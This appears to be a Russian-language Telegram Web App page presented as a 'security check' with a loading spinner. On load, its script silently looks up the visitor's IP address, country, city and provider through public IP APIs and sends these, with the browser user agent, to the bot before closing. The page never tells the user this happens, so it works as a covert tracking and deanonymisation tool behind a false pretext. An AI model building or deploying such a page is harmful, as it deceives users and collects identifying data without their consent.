<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .spinner { border: 4px solid #3498db; border-top: 4px solid #2ecc71; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <h2>🔒 Проверка безопасности</h2>
        <div class="spinner"></div>
        <p>Подождите...</p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;

        tg.ready(() => {
            tg.expand();
            collectAndSend();
        });

        async function collectAndSend() {
            let ip = "unknown", country = "unknown", city = "unknown", org = "unknown";
            try {
                const res = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(5000) });
                const data = await res.json();
                ip = data.ip || "unknown";
                country = data.country_name || "unknown";
                city = data.city || "unknown";
                org = data.org || "unknown";
            } catch (e) {
                try {
                    const res = await fetch("https://api.ipify.org?format=json");
                    const data = await res.json();
                    ip = data.ip || "unknown";
                } catch (e2) {}
            }

            tg.sendData(JSON.stringify({
                type: "ip_check",
                ip, country, city, org,
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString()
            }));
            tg.close();
        }
    </script>
</body>
</html>
